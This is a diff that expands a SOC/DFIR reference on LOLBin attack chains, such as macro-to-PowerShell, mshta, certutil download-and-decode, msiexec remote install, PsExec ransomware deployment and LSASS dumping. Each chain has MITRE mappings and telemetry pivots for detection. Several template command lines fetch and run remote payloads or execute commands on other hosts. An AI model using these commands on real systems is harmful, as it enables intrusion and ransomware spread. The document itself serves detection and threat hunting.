@@ -1,302 +1,498 @@
-Behavioural Attack Chains per LOLBin (with Detailed Reasoning)
+# Behavioural Attack Chains (Comprehensive SOC/DFIR Reference)
 
-Here are solid, realistic chains you’ll see in SOC work. Each has:
+This document provides a complete set of **realistic, high-fidelity attack chains** covering the most common and most dangerous intrusion paths seen in SOC and Incident Response environments.
 
-ASCII chain
+Each chain includes:
 
-Typical use in the wild
+- A clear **ASCII process tree**
+- **Full payload behaviour** (stagers → loaders → C2 → persistence → lateral movement)
+- **MITRE ATT&CK mappings**
+- **Why attackers use this technique**
+- **Telemetry you must pivot to** for investigation
 
-Tactics/techniques
+Attackers frequently chain multiple LOLBins together to remain invisible to basic EDR detection and to avoid dropping obvious binaries. These sequences represent the actual behaviours observed across ransomware incidents, APT intrusions, financial malware, loaders, droppers, remote access trojans and HTML-smuggling campaigns.
 
-Telemetry to pivot to
+Use this document to guide:
 
-Why attackers like it
+- Detection engineering  
+- Threat hunting  
+- Process ancestry analysis  
+- Incident response triage  
+- KQL analytics and queries  
+- Playbook development  
 
-Chain 1 — Phishing Doc → Macro → PowerShell Loader → C2
+---
+
+# Chain 1 — Phishing Doc → Macro → PowerShell Loader → C2
 outlook.exe
   └─ winword.exe (macro-enabled doc)
        └─ powershell.exe (encoded stager)
-            └─ (optional) rundll32.exe or child payload
-                 └─ C2 beacons (http/https)
+            └─ loader.ps1 (download/decrypt)
+                 └─ payload.exe
+                      └─ C2 beacons / recon / credential theft
 
 
 Context / Reasoning
-
-Initial Access: T1566.001 (spearphishing attachment)
-
-Execution: T1059.001 (PowerShell), T1204 (User execution)
-
-C2 / Discovery: T1105, T1082
-
-Attackers love this because:
-
-They get a full interpreter (PS) from a single macro.
-
-Can run obfuscated, encoded scripts (e.g. -enc + base64).
-
-Can load C# in-memory, talk to C2, drop no files.
-
-Key telemetry & pivots:
-
-DeviceProcessEvents: parent=winword.exe, child=powershell.exe
-
-DeviceNetworkEvents: suspicious outbound from that PS process
-
-DeviceFileEvents: any dropped EXEs/DLLs from PS
-
-ThreatIntelligenceIndicator: domains/IPs seen
-
-Chain 2 — HTML Smuggling → MSHTA → PowerShell → Payload
-outlook.exe / browser (chrome.exe/msedge.exe)
-  └─ winword.exe or browser rendering HTML/JS
-       └─ mshta.exe (remote .hta / javascript: / vbscript:)
-            └─ powershell.exe (download + execute)
-                 └─ droppedpayload.exe
-                      └─ network beacon / ransomware / RAT
-
-
-Context / Reasoning
-
-Initial Access: HTML smuggling via doc/email/link
-
-Execution: T1218.005 (Mshta), T1059.001 (PowerShell)
-
-C2: T1105
-
-Why attackers love it:
-
-mshta.exe is signed and trusted.
-
-They can host .hta remotely and change it at will.
-
-HTML/JS obfuscation is trivial, detection is harder at network layer.
-
-Telemetry:
-
-DeviceProcessEvents: mshta parent = Word/browser; PS child of mshta
-
-DeviceNetworkEvents: mshta → remote URL, PS → C2
-
-DeviceFileEvents: artifact writes into %TEMP%, %APPDATA%.
-
-Chain 3 — Script Dropper → WScript/CScript → PowerShell → Scheduled Task Persistence
-outlook.exe
-  └─ winword.exe
-       └─ wscript.exe (malicious .vbs or .js)
-            └─ powershell.exe (stager)
-                 └─ schtasks.exe /create /SC minute /TR <payload>
-
-
-Tactics / Techniques
-
-T1059.005 (wscript/cscript)
-
-T1059.001 (PowerShell)
-
-T1053.005 (Scheduled Task)
-
-T1547 (Persistence)
-
-Why it’s common:
-
-Attackers want persistence that survives reboot and user logoff.
-
-Tasks are easy to hide, especially with obscure names and paths.
-
-Travel well across environments and are easy to script.
-
-Telemetry:
-
-DeviceProcessEvents: Word → wscript → PowerShell → schtasks
-
-DeviceEvents / SecurityEvent: new task created
-
-DeviceFileEvents: task target binary.
-
-Chain 4 — MSI Loader → Malicious DLL via Rundll32
-browser.exe / outlook.exe
-  └─ msiexec.exe /i https://bad[.]domain/payload.msi /qn
-       └─ rundll32.exe <malicious.dll>,ExportFunc
-            └─ payload.exe or in-memory shellcode
-                 └─ C2 / lateral movement / staging
-
-
-Why attackers like it:
-
-MSI is a “normal” installer container with both EXE & DLL inside.
-
-msiexec.exe is a trusted signed binary.
-
-Rundll32 is designed to execute DLL exports.
 
 MITRE:
+T1566.001 (Phishing Attachment)  
+T1059.001 (PowerShell)  
+T1204 (User Execution)  
+T1105 (Tool Transfer)  
+T1082 (System Discovery)
 
-T1218.007 (Msiexec)
-
-T1218.011 (Rundll32)
-
-T1055 (Code Injection / DLL)
+Why attackers use it:
+• Macro → PowerShell gives full interpreter access  
+• Encoded commands hide payload logic  
+• Perfect for staging RATs, loaders, or C2 implants  
 
 Telemetry:
+DeviceProcessEvents: winword.exe → powershell.exe  
+DeviceNetworkEvents: powershell.exe outbound  
+DeviceFileEvents: loader/temp EXE writes  
 
-DeviceProcessEvents: msiexec parent = browser/office; rundll32 child
 
-DeviceFileEvents: new DLLs in user paths; FileCreated → .dll
+# Chain 2 — HTML Smuggling → MSHTA → PowerShell → Payload
+outlook.exe / browser.exe
+  └─ mshta.exe (remote .hta or javascript:/vbscript:)
+       └─ powershell.exe (download cradle)
+            └─ decode → unpack → payload.exe
+                 └─ persistence (registry/scheduled task)
+                      └─ C2 over HTTPS
 
-DeviceNetworkEvents: msiexec fetching from remote hosts.
 
-Chain 5 — Certutil Download → Decode → Execute → C2
+Context / Reasoning
+
+MITRE:
+T1218.005 (Mshta)  
+T1059.001 (PowerShell)  
+T1105 (Download)  
+T1204 (User Execution)
+
+Why attackers use it:
+• HTML smuggling bypasses attachment filtering  
+• mshta.exe is signed and trusted  
+• Easy to update remote script on attacker host  
+
+Telemetry:
+DeviceProcessEvents: mshta.exe parent is browser or Office  
+DeviceNetworkEvents: mshta.exe making remote requests  
+DeviceFileEvents: dropped payloads in %TEMP%  
+
+
+# Chain 3 — Script Dropper → WScript/CScript → PowerShell → Scheduled Task
+outlook.exe
+  └─ winword.exe
+       └─ wscript.exe (malicious VBS/JS)
+            └─ powershell.exe (stager)
+                 └─ schtasks.exe /create (persistence)
+                      └─ payload.exe runs on schedule
+                           └─ C2 + privilege escalation
+
+
+Context / Reasoning
+
+MITRE:
+T1059.005 (Script Execution)  
+T1059.001 (PowerShell)  
+T1053.005 (Scheduled Task)  
+T1547 (Persistence)
+
+Why attackers use it:
+• Ensures persistence even after reboot  
+• Script loaders hide malicious logic  
+• Extremely common in Emotet/Qakbot ecosystems  
+
+Telemetry:
+DeviceProcessEvents: Word → wscript → PS → schtasks  
+DeviceFileEvents: payload dropped into AppData/Temp  
+Scheduled Task logs  
+
+
+# Chain 4 — MSI Loader → Rundll32 → Payload
+browser.exe / outlook.exe
+  └─ msiexec.exe /i https://malicious/payload.msi /qn
+       └─ rundll32.exe malicious.dll,ExportFunc
+            └─ payload.exe (stager)
+                 └─ upload system info
+                      └─ retrieve second-stage binary
+                           └─ C2
+
+
+Context / Reasoning
+
+MITRE:
+T1218.007 (Msiexec)  
+T1218.011 (Rundll32)  
+T1055 (DLL Injection)
+
+Why attackers use it:
+• MSI packages look legitimate  
+• Rundll32 naturally loads DLL exports  
+• Perfect delivery system for banker or RAT DLLs  
+
+Telemetry:
+DeviceProcessEvents: msiexec parented by browser  
+DeviceNetworkEvents: msiexec remote download  
+DeviceFileEvents: DLL written to user directories  
+
+
+# Chain 5 — Certutil → Download → Decode → Execute → C2
 powershell.exe / cmd.exe
   └─ certutil.exe -urlcache -split -f http(s)://... payload.b64
        └─ certutil.exe -decode payload.b64 payload.exe
             └─ payload.exe
-                 └─ C2 beacons / ransomware staging
+                 └─ enumerate system
+                      └─ drop persistence module
+                           └─ C2 beaconing
 
+
+Context / Reasoning
 
 MITRE:
+T1105 (Ingress Tool Transfer)  
+T1140 (Decode Files)  
+T1041 (Exfil/Transfer)
 
-T1105 – Ingress Tool Transfer
-
-T1140 – Deobfuscate/Decode Files
-
-T1041 – Exfil over C2 (if abused for export too)
-
-Why they love it:
-
-Used as “LOL” tool to avoid direct curl/Invoke-WebRequest detection.
-
-Built-in decode pipeline means they can deliver base64 content.
-
-Proxy/inspection may not flag it if misconfigured.
+Why attackers use it:
+• Native Windows tool  
+• Avoids Invoke-WebRequest detections  
+• Built-in decoding pipeline  
 
 Telemetry:
+DeviceProcessEvents: certutil usage  
+DeviceFileEvents: .b64 → .exe  
+DeviceNetworkEvents: outbound connections  
 
-DeviceProcessEvents: certutil with -urlcache and -decode
 
-DeviceFileEvents: .b64 → .exe pipeline
-
-DeviceNetworkEvents: certutil to suspicious domains.
-
-Chain 6 — Service-Based Persistence with sc.exe + Malicious Binary
+# Chain 6 — Service-Based Persistence with sc.exe
 powershell.exe / dropper.exe
-  └─ sc.exe create <svc_name> binPath= "<userdir>\svc.exe" start= auto
-       └─ (on boot) services.exe
-            └─ svc.exe (malicious service payload)
-                 └─ C2 / lateral tools / encryption
+  └─ sc.exe create <svc_name> binPath="<userdir>\svc.exe" start=auto
+       └─ services.exe on reboot
+            └─ svc.exe
+                 └─ injects credential theft module
+                      └─ scans network shares
+                           └─ C2
 
+
+Context / Reasoning
 
 MITRE:
-
-T1543.003 (Windows Service)
-
+T1543.003 (Windows Service Creation)  
 T1569.002 (Service Execution)
 
 Why attackers use it:
-
-Survives reboot.
-
-Runs under SYSTEM if misconfigured.
-
-Many defenders only look at Run keys, not services.
+• SYSTEM privileges  
+• Automatic persistence  
+• Extremely common in ransomware staging  
 
 Telemetry:
+DeviceProcessEvents: sc.exe create  
+DeviceRegistryEvents: new Service key  
+DeviceFileEvents: svc.exe in suspicious directory  
 
-DeviceProcessEvents: sc.exe with create + suspicious binPath.
 
-DeviceRegistryEvents: new HKLM\SYSTEM\CurrentControlSet\Services\<name>
-
-DeviceFileEvents: service binary path.
-
-Chain 7 — WMI/WMIC Recon + Remote Execution
+# Chain 7 — WMI Remote Execution
 powershell.exe / script.exe
-  └─ wmic.exe /node:<target> process call create "cmd.exe /c <payload>"
-       └─ target-host: cmd.exe
-            └─ powershell.exe / payload.exe
+  └─ wmic.exe /node:<target> process call create "cmd.exe /c payload.exe"
+       └─ target: cmd.exe
+            └─ payload.exe
+                 └─ C2 + lateral movement staging
 
+
+Context / Reasoning
 
 MITRE:
+T1047 (WMI Exec)  
+T1021.006 (WMI Lateral Movement)
 
-T1047 – WMI Exec
-
-T1021.006 – WMI Lateral Movement
-
-Used for:
-
-Quiet recon of remote hosts
-
-Fileless-like remote execution
-
-Lateral pivot without RDP / PsExec noise.
+Why attackers use it:
+• Silent execution on remote hosts  
+• No file copy required (if command pulls remote payload)  
+• Very stealthy in flat networks  
 
 Telemetry:
+DeviceProcessEvents: wmic with remote exec  
+Target host logs: cmd.exe launched with network context  
+DeviceNetworkEvents: RPC/DCOM traffic  
 
-DeviceProcessEvents: wmic with process call create
 
-DeviceNetworkEvents: RPC/DCOM communication
-
-SecurityEvent on target: new process / logon events.
-
-Chain 8 — PsExec Lateral Movement + Ransomware
-attacker-host.exe / script
+# Chain 8 — PsExec Lateral Movement → Ransomware Deployment
+malware.exe / script.ps1
   └─ psexec.exe \\target -s -d cmd.exe /c \\share\payload.exe
-       └─ target: psexesvc.exe (service)
+       └─ target: psexesvc.exe
             └─ cmd.exe /c \\share\payload.exe
-                 └─ payload.exe (ransomware)
-                      └─ file encryption + shadow copy deletion
+                 └─ payload.exe
+                      └─ encrypt files
+                           └─ delete shadow copies
+                                └─ beacon to C2 or drop ransom note
 
+
+Context / Reasoning
 
 MITRE:
+T1021.002 (SMB Admin Shares)  
+T1569.002 (Service Execution)  
+T1486 (Data Encryption)
 
-T1021.002 – SMB/Windows Admin Shares
-
-T1569.002 – Service Execution
-
-T1486 – Data Encrypted for Impact
-
-Why common:
-
-Classic technique in NotPetya, Ryuk, Conti, etc.
-
-Low friction if ADMIN$ and credentials are available.
+Why attackers use it:
+• Allows parallel deployment across dozens of hosts  
+• Perfect for ransomware distribution  
+• Admin credentials make this trivial  
 
 Telemetry:
+DeviceFileEvents: ADMIN$ writes  
+DeviceProcessEvents: psexec activities  
+SecurityEvent: service creation (7045)  
 
-DeviceNetworkEvents: port 445 connections from attacker to many hosts.
 
-DeviceProcessEvents: psexec.exe launching psexesvc.exe; payload execution on targets.
+# Chain 9 — Fileless LOLBin → PowerShell → Rundll32 → Dllhost C2
+winword.exe
+  └─ wscript.exe / mshta.exe
+       └─ powershell.exe (-enc)
+            └─ rundll32.exe (shellcode loader)
+                 └─ dllhost.exe (injected)
+                      └─ steady outbound C2
+                           └─ credential harvesting commands
+                                └─ lateral movement prep
 
-SecurityEvent: service creation events (7045), logons from attacker account to many hosts.
 
-Chain 9 — LOLBIN-Only, “Fileless-ish” Attack
-phishing (Office doc)
-  └─ winword.exe
-       └─ wscript.exe / mshta.exe
-            └─ powershell.exe (in-memory loader)
-                 └─ rundll32.exe (reflective DLL injection)
-                      └─ dllhost.exe (injected COM surrogate)
-                           └─ C2 over HTTPS (no obvious custom binary on disk)
-
+Context / Reasoning
 
 MITRE:
+T1059.x (Script + PS)  
+T1218.x (Mshta/Rundll32)  
+T1055 (Injection)
 
-T1059 (multiple sub-techniques)
+Why attackers use it:
+• Hard to detect  
+• Minimal disk artifacts  
+• dllhost.exe is extremely noisy, blends well  
 
-T1218.x (Mshta, Rundll32)
+Telemetry:
+dllhost.exe network activity  
+Process ancestry from Office → script → PS → rundll32  
 
-T1055 (Process Injection)
 
-Reason:
+# Chain 10 — DLL Search Order Hijacking
+legitimate.exe
+  └─ malicious.dll
+       └─ loader inside DLL
+            └─ payload.exe
+                 └─ privilege escalation
+                      └─ C2 communication
 
-As close to “fileless” as you’ll get with LOLBins only.
 
-Very difficult to catch purely via signatures.
+Context / Reasoning
 
-You MUST lean on ancestry + command-line + memory + network.
+MITRE:
+T1574.002 (DLL Order Hijack)  
+T1055 (Injection)
 
-Telemetry Pivots:
+Telemetry:
+DLL loaded from user path  
+legitimate.exe spawning unexpected children  
 
-DeviceProcessEvents: entire ancestry chain from Word down to dllhost.exe.
 
-DeviceNetworkEvents: dllhost.exe / rundll32.exe making outbound connections.
+# Chain 11 — Browser Exploit → PowerShell → Payload
+chrome.exe / msedge.exe
+  └─ (exploit shellcode)
+       └─ powershell.exe
+            └─ stager.ps1
+                 └─ payload.exe
+                      └─ privilege escalation module
+                           └─ C2
 
-ThreatIntelligenceIndicator: hostnames/IPs, JA3 fingerprinting if available.
+
+Context / Reasoning
+
+MITRE:
+T1203 (Exploitation)  
+T1059.001 (PowerShell)
+
+Telemetry:
+powershell spawned by browser  
+memory anomalies in browser process  
+
+
+# Chain 12 — ISO/VHD → App.exe → Malicious DLL → Payload
+explorer.exe
+  └─ mount.iso
+       └─ app.exe
+            └─ malicious.dll
+                 └─ loader stub
+                      └─ payload.exe
+                           └─ beacon + persistence
+
+
+Context / Reasoning
+
+MITRE:
+T1204 (User Execution)  
+T1574.002 (DLL Hijacking)
+
+Telemetry:
+EXEs launched from mounted volumes  
+DLL loads from same path  
+
+
+# Chain 13 — LNK → LOLBin → Stager → Payload
+explorer.exe
+  └─ malicious.lnk
+       └─ powershell.exe / mshta.exe
+            └─ stager
+                 └─ payload.exe
+                      └─ registry persistence
+                           └─ C2
+
+
+Context / Reasoning
+
+MITRE:
+T1204 (LNK Execution)  
+T1059.x (LOLBins)
+
+Telemetry:
+cmdline arguments inside .lnk  
+LOLBin spawned directly by explorer  
+
+
+# Chain 14 — ZIP → JS/VBS → LOLBin → Payload
+explorer.exe
+  └─ unzip malicious.zip
+       └─ wscript.exe script.js
+            └─ powershell.exe
+                 └─ stager
+                      └─ payload.exe
+                           └─ reconnaissance
+                                └─ C2
+
+
+Context / Reasoning
+
+MITRE:
+T1059.005 (Script)  
+T1204 (User Exec)
+
+Telemetry:
+script engines spawning LOLBins  
+script content analysis  
+
+
+# Chain 15 — Browser → CMD → PowerShell → Payload (One-Click Drive-By)
+browser.exe
+  └─ cmd.exe /c (hidden window)
+       └─ powershell.exe (downloadstring/encoded)
+            └─ payload.exe
+                 └─ persistence install
+                      └─ C2 + credential theft
+
+
+Context / Reasoning
+
+MITRE:
+T1059.003 (CMD)  
+T1059.001 (PowerShell)
+
+Telemetry:
+cmd.exe spawned by browser → major red flag  
+C2 after browser event  
+
+
+# Chain 16 — PowerShell → Rundll32 → dllhost Injection → C2
+powershell.exe
+  └─ rundll32.exe malicious.dll
+       └─ injects into dllhost.exe
+            └─ dllhost.exe
+                 └─ C2 beacon
+                      └─ command execution modules
+
+
+Context / Reasoning
+
+MITRE:
+T1055 (Injection)  
+T1218.011 (Rundll32)
+
+Telemetry:
+unexpected dllhost network traffic  
+
+
+# Chain 17 — PowerShell → Inline C# → Shellcode → Memory Beacon
+powershell.exe
+  └─ reflection / Add-Type
+       └─ inject shellcode into process memory
+            └─ in-memory RAT
+                 └─ C2 over HTTPS
+
+
+Context / Reasoning
+
+MITRE:
+T1620 (Reflective Load)  
+T1059.001 (PS)
+
+Telemetry:
+ScriptBlock logs  
+PS using reflection APIs  
+
+
+# Chain 18 — RDPClip → Clipboard Exfiltration
+mstsc.exe
+  └─ rdpclip.exe
+       └─ clipboard copy
+            └─ memory mapped data
+                 └─ exfil via RDP session
+
+
+Context / Reasoning
+
+MITRE:
+T1114 (Data Exfil)  
+T1021.001 (RDP)
+
+Telemetry:
+clipboard anomalies  
+remote session logs  
+
+
+# Chain 19 — BYOVD → Kernel Manipulation → Payload
+dropper.exe
+  └─ install vulnerable_driver.sys
+       └─ driver disables protections
+            └─ payload.exe
+                 └─ ransomware staging
+                      └─ C2
+
+
+Context / Reasoning
+
+MITRE:
+T1068 (Priv Esc)  
+T1562.001 (Disable Security Tools)
+
+Telemetry:
+driver installation events  
+.sys dropped in drivers  
+
+
+# Chain 20 — Credential Dump → LSASS → Exfil
+malicious.exe
+  └─ read LSASS memory
+       └─ generate lsass.dmp
+            └─ parse credentials
+                 └─ exfil via HTTPS
+                      └─ lateral movement next
+
+
+Context / Reasoning
+
+MITRE:
+T1003.001 (LSASS Dump)  
+T1041 (Exfil)
+
+Telemetry:
+lsass handle access  
+dump file creation  
+outbound exfil shortly afterward  
+
